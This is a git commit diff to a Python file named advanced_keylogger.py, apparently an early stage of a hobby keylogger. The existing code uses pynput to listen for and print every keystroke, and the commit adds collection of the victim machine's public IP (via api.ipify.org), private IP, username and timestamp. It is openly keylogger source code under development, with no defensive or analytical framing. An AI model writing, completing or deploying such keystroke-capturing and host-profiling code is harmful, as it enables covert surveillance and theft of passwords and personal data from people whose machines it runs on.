b859f8ae0e352b67a912fd0526eef7ffa005be3f
Kacper <kacwal@poczta.fm>
2019-10-20 12:57:44 +0200

    getting IPs, date  and home directory path

--- advanced_keylogger.py
+++ advanced_keylogger.py
@@ -1,7 +1,23 @@
 from pynput.keyboard import Key, Listener
+import time
+import os
+import random
+import requests
+import socket
+
+publicIP = requests.get('https://api.ipify.org').text
+privateIP = socket.gethostbyname(socket.gethostname())
+user = os.path.expanduser('~').split('/')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
+datetime = time.ctime(time.time())
+
+print(privateIP)
+print(user)
+
+exit()
 
 def on_press(key):
     print(key)
 
+"""keyboard listener"""
 with Listener(on_press=on_press) as listener:
     listener.join()
